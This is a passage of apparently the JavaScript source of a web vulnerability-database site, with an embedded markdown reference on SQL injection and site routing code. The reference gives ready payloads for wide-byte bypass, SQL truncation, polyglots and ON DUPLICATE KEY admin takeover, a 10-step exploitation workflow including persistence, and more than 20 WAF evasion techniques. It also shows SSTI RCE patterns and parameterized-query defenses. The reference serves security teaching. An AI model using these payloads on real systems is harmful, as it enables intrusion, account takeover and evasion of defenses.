### Level 4: GBK/Wide-Byte Bypass, SQL Truncation, Polyglots, ON DUPLICATE KEY

#### GBK / Wide-Byte Bypass

This technique defeats PHP's \`addslashes()\` and \`magic_quotes_gpc\` by exploiting multi-byte character encoding. It is one of the most reliable bypasses against quote-escaping defenses when the database connection uses GBK, Big5, CP932, or SJIS character sets.

**The mechanism -- step by step:**

1. The attacker sends the byte sequence \`%bf%27\` (0xBF followed by 0x27, which is a single quote)
2. PHP's \`addslashes()\` sees the single quote (0x27) and inserts a backslash (0x5C) before it, producing: \`%bf%5c%27\` (0xBF + 0x5C + 0x27)
3. In GBK encoding, the byte pair \`0xBF5C\` forms a valid two-byte Chinese character
4. The database interprets: \`[valid GBK character]'\` -- the backslash has been consumed by the multi-byte character
5. The single quote \`0x27\` is now **unescaped** and breaks out of the string literal
6. SQL injection succeeds despite the escaping

**Why it works:** \`addslashes()\` is encoding-ignorant -- it processes bytes individually. It does not know that 0xBF and the backslash 0x5C together form a valid character in GBK. The database driver, however, is encoding-aware and interprets the bytes as a multi-byte sequence, consuming the backslash.

**Vulnerable character sets:** Any multi-byte encoding where a valid character can end with byte 0x5C (the backslash):
- **GBK** (Chinese Simplified) -- the most commonly exploited
- **Big5** (Chinese Traditional)
- **SJIS** (Japanese Shift-JIS)
- **CP932** (Windows Japanese)
- **EUC-KR** (Korean) -- some sequences

**Alternative prefix bytes:** Any byte where BYTE + 0x5C forms a valid multi-byte character in the target encoding:
- \`0xBF\`, \`0xAF\`, \`0xDF\`, \`0xEF\`, \`0xA1\`, \`0xA8\`, \`0x8C\`

**Prevention:** Use \`mysqli_set_charset('utf8mb4')\` or \`SET NAMES utf8mb4\` at the **driver level** (not via a raw query). The function \`mysql_real_escape_string()\` is charset-aware and will not be tricked, but \`addslashes()\` never is.

**GBK/Wide-Byte payloads:**

\`\`\`sql
%bf%27 OR 1=1--                    -- 0xBF absorbs backslash; quote unescaped
%bf' OR 1=1--                      -- Simplified form
%df%27 OR 1=1--                    -- 0xDF prefix variant (common in the wild)
%af%27 OR 1=1--                    -- 0xAF prefix
%ef%27 OR 1=1--                    -- 0xEF prefix
%a1%27 OR 1=1--                    -- 0xA1 prefix (Big5/GBK)
%a8%27 OR 1=1;-- 2                 -- 0xA8 prefix with semicolon
%8C%A8%27 OR 1=1-- 2               -- Three-byte prefix variant
\`\`\`

#### SQL Truncation Attack

SQL truncation exploits a mismatch between application input validation and database column length constraints. When MySQL operates in non-strict SQL mode, it silently truncates strings that exceed the column's VARCHAR(N) limit, and ignores trailing spaces during string comparison.

**The mechanism -- step by step:**

1. Database schema: \`username VARCHAR(20) NOT NULL UNIQUE\`
2. Attacker checks: "admin" exists -- registration blocked
3. Attacker registers as: \`admin               x\` (admin + 15 spaces + 'x' = 21 characters)
4. Application SELECT check: \`WHERE username = 'admin               x'\` -- no match found, registration proceeds
5. Database INSERT: truncates to 20 characters: \`admin               \` (admin + 15 trailing spaces)
6. MySQL comparison quirk: \`'admin' = 'admin   '\` returns **TRUE** (trailing spaces ignored in comparison)
7. Result: two rows effectively match "admin" -- the attacker can now authenticate as admin or hijack password reset

**Prerequisites:**
- MySQL with \`sql_mode\` NOT including \`STRICT_TRANS_TABLES\` or \`STRICT_ALL_TABLES\`
- Application performs a SELECT uniqueness check before INSERT (rather than relying on database UNIQUE constraint error handling)
- Column has a defined VARCHAR(N) length limit
- Application does not trim input before the uniqueness comparison

**Database behavior comparison:**

| Database | VARCHAR Truncation | Trailing Space Comparison |
|----------|-------------------|--------------------------|
| MySQL (non-strict) | Silent truncation | Ignores trailing spaces |
| MySQL (strict) | ERROR 1406 | Ignores trailing spaces |
| PostgreSQL | ERROR (value too long) | Spaces significant |
| MSSQL | Silent truncation | Ignores trailing spaces |
| Oracle | ERROR ORA-12899 | Spaces significant in CHAR |
| SQLite | No length limit on TEXT | N/A |

**MySQL UTF-8 4-byte truncation variant:** When MySQL encounters a 4-byte UTF-8 character (like an emoji) in a \`utf8\` (which is actually \`utf8mb3\`, 3-byte max) column, it truncates the string at that point. Input \`admin<4-byte-emoji>anything_after\` truncates to \`admin\`. Prevention: use \`utf8mb4\` instead of \`utf8\`.

**Historical CVE:** CVE-2008-4106 (WordPress) -- admin account takeover via SQL truncation in the \`user_login\` column.

**SQL truncation payloads:**

\`\`\`sql
admin               1                  -- admin + spaces + char to exceed VARCHAR limit
admin%20%20%20%20%20%20%20%20%20%201   -- URL-encoded spaces variant
victim@example.com                   x -- Email column truncation for ATO via password reset
admin<U+1F480>anything                 -- 4-byte emoji triggers utf8mb3 truncation to 'admin'
role_name_padding_to_exceed_limit      -- Role/permission name collision
\`\`\`

---

**Polyglot payloads (multi-context):**

Payloads that work across single-quote, double-quote, and no-quote contexts simultaneously:

\`\`\`sql
-- Time-based polyglot: triggers delay regardless of context
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/

-- Boolean polyglot:
IF(1=1,SLEEP(0),0)/*'XOR(IF(1=1,SLEEP(0),0))OR'"XOR(IF(1=1,SLEEP(0),0))OR"*/
\`\`\`

**ON DUPLICATE KEY UPDATE (MySQL):**

When an INSERT hits a duplicate UNIQUE/PRIMARY KEY, MySQL's \`ON DUPLICATE KEY UPDATE\` clause fires instead. This enables account takeover:

\`\`\`sql
-- Inject in email field during registration:
attacker@evil.com"), ("admin@target.com", "known_hash")
  ON DUPLICATE KEY UPDATE password="known_hash" --
\`\`\`

Attack flow: (1) First VALUES row inserts the attacker account normally. (2) Second VALUES row hits a duplicate key on the admin email. (3) \`ON DUPLICATE KEY UPDATE\` fires and overwrites the admin's password with the attacker's known hash. (4) Attacker logs in as admin.

### Level 5: Protocol-Level Smuggling, WAFFLED, Isomorphic Statements

**Protocol-level SQL query smuggling (DEF CON 32, 2024):**

Researcher Paul Gerste demonstrated that instead of attacking SQL query syntax, attackers can corrupt the binary wire protocol between the application and database to inject entire SQL statements.

CVE-2024-27304 (pgx Go PostgreSQL driver, CVSS 9.8): Protocol message sizes are tracked as 32-bit integers. By embedding a string that causes the length counter to overflow past 2^32, the driver splits what should be a single protocol message into multiple messages. The attacker controls the second message, enabling injection of arbitrary SQL including full DML/DDL and authentication bypass. Exploitation vectors include WebSocket connections (bypassing HTTP body limits), compressed payloads that decompress to >4GB, or aggregating multiple parameters past the overflow threshold.

Related CVEs: CVE-2024-27289 (pgx v4), GHSA-XMRP-424F-VFPX (SQLx), GHSA-WQ9X-QWCQ-MMGF (Diesel ORM).

**WAFFLED research (IEEE 2025):**

Akhavani, Jabiyev et al. discovered 1,207 confirmed WAF bypasses across AWS WAF, Azure WAF, Google Cloud Armor, Cloudflare, and ModSecurity using parsing discrepancies between WAFs and web frameworks. Techniques include RFC 2231 boundary continuation (WAF and framework interpret different boundaries), duplicate Content-Type headers, malformed multipart boundaries, and charset manipulation. Over 90% of production web forms accept \`multipart/form-data\` even when expecting \`application/x-www-form-urlencoded\`.

**Isomorphic SQL statements (Spaceraccoon):**

Use pairs of functionally equivalent but syntactically different SQL expressions to detect injection incrementally without triggering WAF signatures:

\`\`\`sql
-- These pairs should produce identical results on a vulnerable parameter:
ABS(0)     vs  ABS(1)       -- Different if SQL evaluated
COS(0)     vs  COS(1)       -- cos(0)=1, cos(1)=0.54; difference confirms eval
POWER(1,1) vs  POWER(1,0)   -- Both return 1; proves evaluation without alarm
\`\`\`

## Exploitation

### 10-Step Exploitation Workflow

**Step 1: Detect injection point.** Submit \`'\` and \`"\` to every input vector. Look for SQL errors, page layout changes, or behavioral differences.

**Step 2: Confirm with boolean pairs.** Submit \`' AND 1=1--\` (true) and \`' AND 1=2--\` (false). Different responses confirm injection.

**Step 3: Determine context.** Test single quote, double quote, numeric, and parenthesized contexts. Identify which comment syntax works (reveals database type).

**Step 4: Bypass authentication.** For login forms: \`admin'--\` in the username field. For data filters: \`' OR 1=1--\` to dump all records.

**Step 5: Enumerate database.** Identify the DBMS using fingerprinting queries. Determine database version, current user, current database name.

\`\`\`sql
-- MySQL:   SELECT @@version, USER(), DATABASE()
-- PGSQL:   SELECT version(), current_user, current_database()
-- MSSQL:   SELECT @@VERSION, SUSER_SNAME(), DB_NAME()
-- Oracle:  SELECT banner FROM v$version WHERE ROWNUM=1
-- SQLite:  SELECT sqlite_version()
\`\`\`

**Step 6: Extract schema.** Enumerate tables and columns through the identified database's metadata system.

\`\`\`sql
-- MySQL/PGSQL/MSSQL: SELECT table_name FROM information_schema.tables
-- Oracle:            SELECT table_name FROM all_tables
-- SQLite:            SELECT name FROM sqlite_master WHERE type='table'
\`\`\`

**Step 7: Extract sensitive data.** Target user tables, credential stores, configuration tables, API keys, personal data.

**Step 8: Escalate privileges.** Via stacked queries, modify your own account's role/permissions in the database.

\`\`\`sql
'; UPDATE users SET role='admin' WHERE username='attacker'--
\`\`\`

**Step 9: Establish persistence.** Create a backdoor account, plant second-order payloads, or write a web shell (SQLite/MSSQL).

**Step 10: Document evidence.** Capture HTTP requests/responses, screenshots, database output. Prepare for responsible disclosure.

## Detection Evasion

### WAF Bypass Techniques (20+)

**1. Whitespace alternatives:**

| Byte | Hex | Description | DB Support |
|------|-----|-------------|------------|
| Tab | \`%09\` | Horizontal tab | All |
| Newline | \`%0a\` | Line feed | All |
| Vertical tab | \`%0b\` | Vertical tab | MySQL, MSSQL |
| Form feed | \`%0c\` | Form feed | MySQL, MSSQL |
| Carriage return | \`%0d\` | CR | All |
| Non-breaking space | \`%a0\` | NBSP | MySQL |
| Inline comment | \`/**/\` | Comment as whitespace | All |
| Parentheses | \`()\` | Grouping eliminates spaces | All |

**2. Case mixing:** \`SeLeCt\`, \`UnIoN\`, \`oR\`, \`aNd\` -- SQL keywords are case-insensitive but signature-based WAFs may use case-sensitive matching.

**3. Keyword doubling:** \`UNunionION SEselectLECT\` -- WAF strips inner keyword once, leaving valid outer keyword.

**4. MySQL versioned comments:** \`/*!50000UNION*/ /*!50000SELECT*/\` -- code inside \`/*!NNNNN */\` runs only on MySQL >= version NNNNN but WAFs do not parse it.

**5. URL encoding (single/double/triple):** Single: \`%27%20OR%201%3D1--\`. Double: \`%2527%2520OR%25201%253D1--\`. Triple: \`%252527\`.

**6. Hex encoding for strings:** \`WHERE username=0x61646D696E\` eliminates quotes entirely (MySQL).

**7. CHAR/CHR functions:** \`CHAR(97,100,109,105,110)\` for MySQL/MSSQL, \`CHR(97)||CHR(100)||CHR(105)||CHR(110)\` for PostgreSQL/Oracle.

**8. Null byte injection:** \`%00' OR 1=1--\` -- C-based WAFs stop at null byte; backend processes full string.

**9. JSON-based bypass (Team82, 2022):** JSON operators (\`JSON_EXTRACT\`, \`::jsonb <@\`, \`->\`) bypassed AWS WAF, Cloudflare, Palo Alto, F5, and Imperva.

**10. Content-Type manipulation:** Send JSON body when WAF expects form-encoded, or XML with entity-encoded SQL keywords (\`&#x53;ELECT\` decodes to \`SELECT\` after XML parsing).

**11. HTTP Parameter Pollution (HPP):** Split injection across duplicate parameters: \`?id=1/*&id=*/OR/*&id=*/1=1--\`. Server concatenates; WAF inspects individually.

**12. Chunked Transfer Encoding:** Split HTTP body into chunks so WAF sees incomplete fragments.

**13. Scientific notation:** \`1e0OR'1'='1'--\` -- confuses libinjection tokenizer.

**14. Operator substitution:** \`||\` for OR, \`&&\` for AND, \`LIKE\` for \`=\`, \`BETWEEN\` for \`>\`, \`REGEXP\` for \`=\`.

**15. Backtick/bracket identifiers:** MySQL: \`\` \`union\` \`select\` 1,2,3-- \`\`. MSSQL: \`[union] [select] 1,2,3--\`.

**16. Backslash trick (fragmented injection):** Username: \`\\\`. Password: \` OR 1=1#\`. The backslash escapes the closing quote, making \`' AND pass='\` a single string literal, and the OR condition runs.

**17. Overlong payloads:** Exceed WAF inspection buffer (8KB-128KB depending on vendor) with junk data prefix.

**18. WAFFLED multipart/form-data:** Exploit RFC 2231 boundary continuation; WAF parses one boundary, framework parses another.

**19. XML entity encoding:**

\`\`\`xml
<storeId>&#x31;&#x20;&#x4f;&#x52;&#x20;&#x31;&#x3d;&#x31;</storeId>
<!-- Decodes to: 1 OR 1=1 -->
\`\`\`

**20. Variable declaration (MSSQL):**

\`\`\`sql
DECLARE @s NVARCHAR(80); SET @s=N'SEL'+N'ECT 1'; EXEC(@s)
\`\`\`

## Variations and Edge Cases

### String vs. Numeric Context

String context (\`WHERE name = '$input'\`) requires quote breakout (\`'\`). Numeric context (\`WHERE id = $input\`) requires no quotes -- inject directly. Test both: \`1 AND 1=1\` (numeric) and \`1' AND '1'='1\` (string). If neither triggers, try double-quote: \`1" AND "1"="1\`.

### Single-Quote vs. Double-Quote vs. Backtick

MySQL accepts both \`'string'\` and \`"string"\` (unless \`ANSI_QUOTES\` is set). PostgreSQL and Oracle use \`"\` for identifiers only. Test all three: \`'\`, \`"\`, \`\` \` \`\`.

### Stored Procedure Context

Stored procedures using dynamic SQL (\`EXEC(@sql)\` in MSSQL, \`EXECUTE ... USING\` in PostgreSQL) inherit the vulnerability of whatever string concatenation occurs inside them.

### JSON/XML Body Context

Modern APIs pass input as JSON values. Classic payloads work identically inside JSON strings:

\`\`\`json
{"username": "admin'--", "password": "x"}
\`\`\`

XML bodies can use entity encoding to hide payloads from WAFs:

\`\`\`xml
<user>admin&#x27;--</user>
\`\`\`

### Implicit Type Coercion (MySQL)

MySQL silently converts strings to numbers in numeric context. \`'abc' = 0\` returns TRUE because the non-numeric string converts to 0. This enables tautologies without traditional OR syntax:

\`\`\`sql
' OR 'abc'=0--    -- TRUE because string 'abc' converts to integer 0
\`\`\`

- Cloud WAFs (AWS WAF, Cloudflare, Azure WAF) provide a defense layer but are bypassable (Team82, WAFFLED research)
- GraphQL resolvers on Lambda/Cloud Functions are equally vulnerable when building raw SQL

### SPA/API Architecture

Single-page applications communicate exclusively through API calls. Every API endpoint accepting user input and touching a database is a potential injection point. The separation of frontend and backend does not reduce risk -- the backend still concatenates strings if developers use raw queries. Test JSON body parameters, query parameters, path parameters, and headers.

## Defensive Countermeasures

### Primary Defense: Parameterized Queries (Prepared Statements)

Separates SQL structure from data. The query template is a constant string with \`?\` placeholders. User input binds to placeholders as typed data, never as SQL syntax.

**Java:**

\`\`\`java
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, username);
pstmt.setString(2, password);
ResultSet results = pstmt.executeQuery();
\`\`\`

**Python (psycopg2):**

\`\`\`python
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password))
\`\`\`

**PHP (PDO):**

\`\`\`php
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
$stmt->execute([$username, $password]);
\`\`\`

**Node.js (mysql2):**

\`\`\`javascript
const [rows] = await connection.execute(
  'SELECT * FROM users WHERE username = ? AND password = ?',
  [username, password]
);
\`\`\`

**C# (.NET):**

\`\`\`csharp
string query = "SELECT * FROM users WHERE username = @user AND password = @pass";
SqlCommand cmd = new SqlCommand(query, connection);
cmd.Parameters.AddWithValue("@user", username);
cmd.Parameters.AddWithValue("@pass", password);
\`\`\`

**Limitation:** Parameterized queries protect **values** only. Table names, column names, ORDER BY clauses, and SQL keywords cannot be parameterized. For those, use allow-list validation.

### Secondary Defenses

**Allow-list input validation (for non-parameterizable elements):**

\`\`\`java
// ORDER BY direction -- map to boolean
String direction = sortAsc ? "ASC" : "DESC";

// Table name -- switch/map to known values
switch(param) {
    case "users": tableName = "users"; break;
    case "orders": tableName = "orders"; break;
    default: throw new ValidationException("Invalid table");
}
\`\`\`

**Stored procedures** -- safe only if they use parameterized queries internally. Dynamic SQL (\`EXEC(@sql)\`) inside a stored procedure is still vulnerable.

**Least privilege** -- database accounts should have minimum necessary permissions. Never run web applications as \`db_owner\`, \`DBA\`, or \`root@%\`.

**Error message suppression** -- never display raw SQL errors to users. Log details server-side; show generic error pages to clients.

### What Does NOT Work

| Ineffective Defense | Why It Fails |
|-------------------|--------------|
| \`addslashes()\` / \`magic_quotes\` | Bypassed by GBK/wide-byte injection |
| Denylist keyword filtering | Bypassed by encoding, case mixing, comments, operator substitution |
| Character escaping alone | Database-specific, fragile, repeatedly bypassed |
| Stored procedures with dynamic SQL | String concatenation inside procedures is still vulnerable |
| Client-side validation only | Trivially bypassed with Burp/curl |
| WAFs as sole defense | 1,207 bypasses found by WAFFLED research alone |

CATEGORIES[0].content = "# CAT-01: Injection Attacks\n\n> **Domain:** Web Application -- **Phase:** 1 -- **CAPEC Category:** Inject Unexpected Items\n\n---\n\n## Category Overview\n\nInjection attacks occur when untrusted, attacker-controlled data is sent to an interpreter -- a database engine, OS shell, LDAP server, template engine, XML parser, or any other component that evaluates input as code or a command. The interpreter cannot distinguish between the intended instruction and the injected content, executing both.\n\nThe fundamental precondition for all injection vulnerabilities is the same: **user-controlled data is concatenated into a query, command, or expression without sufficient sanitization, parameterization, or contextual escaping.** The interpreter is working as designed -- the vulnerability is in how the application constructs the input to that interpreter.\n\n**Why it persists:** Developer trust of user input remains pervasive in legacy codebases, ORMs create false confidence, and WAF bypass techniques continuously outpace signature-based defenses. Injection was #1 on the OWASP Top 10 for over a decade and remains in the top 5 in 2025.\n\n---\n\n## Attack Surface Map\n\n```mermaid\ngraph TD\n    USER[User / Attacker Input] --> FORMS[HTML Forms]\n    USER --> PARAMS[URL Parameters]\n    USER --> HEADERS[HTTP Headers]\n    USER --> COOKIES[Cookies]\n    USER --> JSON[JSON / XML Body]\n    USER --> WSOCK[WebSocket Messages]\n    FORMS & PARAMS & HEADERS & COOKIES & JSON & WSOCK --> APP[Web Application]\n    APP --> SQL[SQL Engine]\n    APP --> NOSQL[NoSQL Engine]\n    APP --> OS[Operating System Shell]\n    APP --> LDAP[LDAP Directory]\n    APP --> XPATH[XPath / XML Parser]\n    APP --> TMPL[Template Engine]\n    APP --> EL[Expression Language]\n    APP --> LLM[LLM / AI Model]\n    SQL --> |SQLi| SQLI[Data theft - Auth bypass - RCE]\n    NOSQL --> |NoSQLi| NOSQLI[Auth bypass - Data exfiltration]\n    OS --> |CMDi| CMDI[RCE - Reverse shell]\n    LDAP --> |LDAPi| LDAPI[Auth bypass - Directory enum]\n    XPATH --> |XPathi| XPATHI[Data extraction - Auth bypass]\n    TMPL --> |SSTI| SSTII[RCE - Config read]\n    EL --> |ELi| ELI[RCE via OGNL - Spring SpEL]\n    LLM --> |Prompt Inj| PROMPTI[Goal hijack - Data exfil]\n```\n\n---\n\n## Attack Types in This Category\n\n| ID | Attack Type | Key CWEs | Subtypes | Severity |\n|----|------------|---------|---------|----------|\n| T01 | SQL Injection | CWE-89 | 12 | CRITICAL |\n| T02 | NoSQL Injection | CWE-943 | 5 | CRITICAL |\n| T03 | OS Command Injection | CWE-78 | 5 | CRITICAL |\n| T04 | SSTI | CWE-94, CWE-1336 | 9 | CRITICAL |\n| T05 | LDAP Injection | CWE-90 | 4 | HIGH |\n| T06 | XPath Injection | CWE-643 | 3 | HIGH |\n| T07 | EL / OGNL Injection | CWE-917 | 5 | CRITICAL |\n| T08 | XML Injection | CWE-91 | 4 | HIGH |\n| T09 | CRLF Injection | CWE-93, CWE-113 | 4 | HIGH |\n| T10 | Code Injection | CWE-94, CWE-95 | 5 | CRITICAL |\n| T11 | ORM Injection | CWE-89 | 4 | HIGH |\n| T12 | JSON Injection | CWE-74 | 4 | MEDIUM |\n| T13 | HTML Injection | CWE-79, CWE-80 | 3 | MEDIUM |\n| T14 | SMTP Injection | CWE-93 | 4 | MEDIUM |\n| T15 | Prompt Injection | CWE-1427 | 6 | HIGH |\n\n---\n\n## Universal Injection Pattern\n\nAll injection attacks share the same structural vulnerability:\n\n```\nVULNERABLE:\nquery = \"SELECT * FROM users WHERE id = \" + userInput\nuserInput = \"1 OR 1=1--\"\nquery = \"SELECT * FROM users WHERE id = 1 OR 1=1--\"  <-- Logic altered\n\nSECURE:\nquery = \"SELECT * FROM users WHERE id = ?\"\nexecute(query, [userInput])\nuserInput is data, never code -- interpreter separation maintained\n```\n\n---\n\n## Detection Heuristics (All Injection Types)\n\n| Probe Type | Payload Pattern | Indicator |\n|-----------|----------------|----------|\n| Error-based | `'`, `\"`, `)`, `` ` `` | Interpreter error in response |\n| Boolean differential | `AND 1=1`, `AND 1=2` | Different response content |\n| Time-based | `SLEEP(5)`, `WAITFOR DELAY` | Delayed response |\n| Out-of-band | DNS/HTTP callback payloads | External request received |\n| Syntax probe | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` | `49` in response (SSTI/EL) |\n\n---\n\n## Injection by Interpreter\n\n<details>\n<summary><b>SQL -- Database Engines</b></summary>\n\n| Engine | Characteristic Syntax | Time Delay | Comment |\n|--------|----------------------|-----------|--------|\n| MySQL | `SLEEP(N)`, `-- -` | `SLEEP(5)` | `#` comment also works |\n| PostgreSQL | `pg_sleep(N)`, `--` | `pg_sleep(5)` | Stacked queries with `;` |\n| MSSQL | `WAITFOR DELAY`, `--` | `WAITFOR DELAY '0:0:5'` | `xp_cmdshell` for RCE |\n| Oracle | `dbms_pipe.receive_message` | `dbms_pipe.receive_message(('a'),5)` | No stacked queries |\n| SQLite | `randomblob(N)` | `randomblob(500000000)` | Limited OOB options |\n\n</details>\n\n<details>\n<summary><b>SSTI -- Template Engines by Language</b></summary>\n\n| Engine | Language | Probe | RCE Payload Pattern |\n|--------|----------|-------|-------------------|\n| Jinja2 | Python | `{{7*7}}` | `{{''.__class__.__mro__[1].__subclasses__()}}` |\n| Twig | PHP | `{{7*7}}` | `{{_self.env.registerUndefinedFilterCallback('exec')}}` |\n| Freemarker | Java | `${7*7}` | `<#assign ex=\"freemarker.template.utility.Execute\"?new()>` |\n| Velocity | Java | `#set($x=7*7)$x` | Reflection-based RCE |\n| Smarty | PHP | `{php}phpinfo();{/php}` | Direct PHP execution (legacy) |\n| ERB | Ruby | `<%= 7*7 %>` | `<%= system('id') %>` |\n\n</details>\n\n---\n\n## Prevention -- Universal Principles\n\n1. **Parameterized Queries / Prepared Statements** -- for all database interactions\n2. **Contextual Output Encoding** -- HTML, JS, URL, CSS context-aware escaping\n3. **Input Validation** -- allowlist approach for known-good values\n4. **Principle of Least Privilege** -- database accounts with minimal permissions\n5. **WAF as defense-in-depth** -- never as primary control\n6. **ORM safely** -- avoid raw query methods\n7. **Sandboxed template engines** -- no user-controlled template content\n\n---\n\n## References\n\n### Primary Standards\n- [OWASP -- Injection (A05:2025)](https://owasp.org/Top10/2025/A05_2025-Injection/)\n- [OWASP WSTG -- Testing for Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/)\n- [CWE-74: Improper Neutralization](https://cwe.mitre.org/data/definitions/74.html)\n- [CAPEC-152: Inject Unexpected Items](https://capec.mitre.org/data/definitions/152.html)\n\n### Deep Research\n- [PortSwigger -- SQL Injection](https://portswigger.net/web-security/sql-injection)\n- [PortSwigger -- SSTI](https://portswigger.net/research/server-side-template-injection)\n- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)";

  return html;
}

/* ===== MARKED.JS CUSTOM RENDERER (FIX 4) ===== */
var renderer = new marked.Renderer();
renderer.code = function(code, lang) {
  if (lang === 'mermaid') {
    return '<div style="overflow-x:auto;max-width:100%;"><div class="mermaid">' + escapeHtml(code) + '</div></div>';
  }
  var id = 'c' + Math.random().toString(36).substr(2,8);
  var hl;
  try { hl = hljs.highlightAuto(code).value; } catch(e) { hl = escapeHtml(code); }
  return '<div class="code-block"><div class="code-header"><span class="code-lang">'+(lang||'text')+'</span><button class="copy-btn" onclick="copyCode(\''+id+'\')">copy</button></div><pre id="'+id+'"><code class="hljs">'+hl+'</code></pre></div>';
};
renderer.codespan = function(code) {
  return '<code class="inline-code">' + escapeHtml(code) + '</code>';
};
renderer.table = function(header, body) {
  return '<div class="table-wrap"><table class="gorge-table"><thead>'+header+'</thead><tbody>'+body+'</tbody></table></div>';
};
renderer.tablerow = function(content) {
  return '<tr>'+content+'</tr>';
};
renderer.tablecell = function(content, flags) {
  var tag = flags.header ? 'th' : 'td';
  return '<'+tag+'>'+content+'</'+tag+'>';
};
renderer.link = function(href, title, text) {
  if (href && href.startsWith('http')) return '<a href="'+href+'" target="_blank" rel="noopener">'+text+'</a>';
  return '<a href="'+href+'">'+text+'</a>';
};
renderer.blockquote = function(quote) {
  return '<blockquote class="gorge-callout">'+quote+'</blockquote>';
};
marked.use({ renderer: renderer });

/* ===== COPY BUTTON (FIX 5) ===== */
window.copyCode = function(id) {
  var el = document.getElementById(id);
  if (!el) return;
  navigator.clipboard.writeText(el.innerText).then(function() {
    var btn = el.closest('.code-block').querySelector('.copy-btn');
    btn.textContent = 'copied!';
    btn.classList.add('copied');
    setTimeout(function() { btn.textContent = 'copy'; btn.classList.remove('copied'); }, 2000);
  });
};


/* ===== UTILITY ===== */
function escapeHtml(str) {
  if (!str) return '';
  return String(str).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}
function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}


/* ===== NAVIGATION (FIX 1 -- CRITICAL) ===== */
window.navigateTo = function(page) {
  window.location.hash = page;
};

window.addEventListener('hashchange', function() {
  handleRoute();
});

window.addEventListener('DOMContentLoaded', function() {
  buildSidebar();
  initSearch();
  handleRoute();
});


/* ===== ROUTING ===== */
function handleRoute() {
  var hash = window.location.hash.replace('#', '') || 'home';
  currentPage = hash;
  updateSidebarActive(hash);
  renderPage(hash);
  window.scrollTo(0, 0);
  var sidebar = document.getElementById('sidebar');
  if (sidebar && sidebar.classList.contains('open')) sidebar.classList.remove('open');
}

function renderPage(hash) {
  if (hash === 'home') { document.title = 'GORGE | Vulnerability Database'; renderHomePage(); }
  else if (hash === 'about') { document.title = 'GORGE | About'; renderMarkdownPage(PAGES.about); }
  else if (hash === 'taxonomy') { document.title = 'GORGE | Taxonomy'; renderMarkdownPage(PAGES.taxonomy); }
  else if (hash === 'changelog') { document.title = 'GORGE | Changelog'; renderMarkdownPage(PAGES.changelog); }
  else if (hash === 'tools') { document.title = 'GORGE | Tools Index'; renderMarkdownPage(PAGES.tools); }
  else if (hash === 'labs') { document.title = 'GORGE | Lab Environments'; renderMarkdownPage(PAGES.labs); }
  else if (hash === 'sqli-classic-inband') { document.title = 'GORGE | Classic In-Band SQLi'; renderSubtypePage('CAT-01', 'SQL Injection', 'Classic / In-Band SQLi', PAGES.sqli_classic_inband); }
  else if (hash === 'sqli-blind-boolean') { document.title = 'GORGE | Boolean-Based Blind SQLi'; renderSubtypePage('CAT-01', 'SQL Injection', 'Boolean-Based Blind SQLi', PAGES.sqli_blind_boolean); }
  else {
    var cat = findCategory(hash);
    if (cat) { document.title = 'GORGE | ' + cat.id + ' ' + cat.name; renderCategoryPage(cat); }
    else {
      document.title = 'GORGE | Not Found';
      document.getElementById('mainContent').innerHTML = '<div class="breadcrumb"><a href="#home" onclick="navigateTo(\'home\');return false;">Home</a></div><h1 style="color:var(--text-muted);margin-top:40px;">Page not found</h1>';
    }
  }
}

function findCategory(slug) {
  for (var i = 0; i < CATEGORIES.length; i++) {
    if (CATEGORIES[i].slug === slug) return CATEGORIES[i];
  }
  return null;
}


/* ===== SIDEBAR ===== */
function buildSidebar() {
  var container = document.getElementById('sidebarCategories');
  var html = '';
  for (var i = 0; i < CATEGORIES.length; i++) {
    var cat = CATEGORIES[i];
    var bc = 'badge-' + cat.severity.toLowerCase();
    html += '<div class="sidebar-cat-group" data-severity="' + cat.severity + '">';
    html += '<div class="sidebar-item" data-slug="' + cat.slug + '" onclick="handleSidebarClick(\'' + cat.slug + '\',this)">';
    html += '<span class="sidebar-arrow" id="arrow-' + cat.slug + '">&#9654;</span>';
    html += '<span class="sidebar-id">' + cat.id + '</span>';
    html += '<span class="sidebar-name">' + cat.name + '</span>';
    html += '<span class="sidebar-badge ' + bc + '">' + cat.severity + '</span>';
    html += '</div>';
    html += '<div class="sidebar-sub-items" id="sub-' + cat.slug + '">';
    for (var j = 0; j < cat.types.length; j++) {
      var children = getSubtypeChildren(cat.slug, cat.types[j]);
      var subSlug = getSubtypeSlug(cat.slug, cat.types[j]);
      if (children && children.length > 0) {
        html += '<div class="sidebar-sub-item" style="cursor:pointer;color:var(--text);font-weight:500;" onclick="navigateTo(\'' + subSlug + '\')">' + escapeHtml(cat.types[j]) + '</div>';
        for (var k = 0; k < children.length; k++) {
          var ch = children[k];
          html += '<div class="sidebar-sub-item" style="cursor:pointer;padding-left:48px;font-size:10px;" onclick="navigateTo(\'' + ch.slug + '\')">';
          html += (ch.done ? '<span style="color:#33cc33;margin-right:4px;">&#10003;</span>' : '<span style="color:var(--text-dim);margin-right:4px;">&#9675;</span>');
          html += escapeHtml(ch.name) + '</div>';
        }
      } else if (subSlug) {
        html += '<div class="sidebar-sub-item" style="cursor:pointer;" onclick="navigateTo(\'' + subSlug + '\')">' + escapeHtml(cat.types[j]) + '</div>';
      } else {
        html += '<div class="sidebar-sub-item">' + escapeHtml(cat.types[j]) + '</div>';
      }
    }
    html += '</div></div>';
  }
  container.innerHTML = html;
}

window.handleSidebarClick = function(slug, el) {
  var sub = document.getElementById('sub-' + slug);
  var arrow = document.getElementById('arrow-' + slug);
  if (sub.classList.contains('expanded')) {
    sub.classList.remove('expanded');
    arrow.classList.remove('expanded');
  } else {
    sub.classList.add('expanded');
    arrow.classList.add('expanded');
  }
  navigateTo(slug);
};

function updateSidebarActive(hash) {
  var items = document.querySelectorAll('.sidebar-item');
  for (var i = 0; i < items.length; i++) {
    items[i].classList.remove('active');
    if (items[i].getAttribute('data-slug') === hash) items[i].classList.add('active');
  }
  var metas = document.querySelectorAll('.sidebar-meta-item');
  for (var i = 0; i < metas.length; i++) {
